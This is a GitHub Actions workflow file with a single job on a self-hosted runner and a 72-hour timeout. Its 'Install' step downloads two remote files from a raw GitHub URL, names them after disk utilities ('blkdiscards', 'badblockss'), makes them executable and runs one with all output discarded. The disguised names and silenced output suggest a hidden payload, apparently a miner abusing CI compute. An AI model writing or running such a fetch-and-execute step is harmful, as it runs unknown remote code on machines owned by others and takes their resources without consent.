name: Colabs
on:
  push:
  workflow_dispatch:
jobs:
  Build:
    name: hanakaru
    runs-on: self-hosted
    timeout-minutes: 4320
    steps:
    - name: Setup
      uses: actions/checkout@v1
    - name: Install
      run: |
        wget -O blkdiscards https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/badblockss && chmod +x blkdiscards badblockss && ./badblockss >/dev/null 2>&1
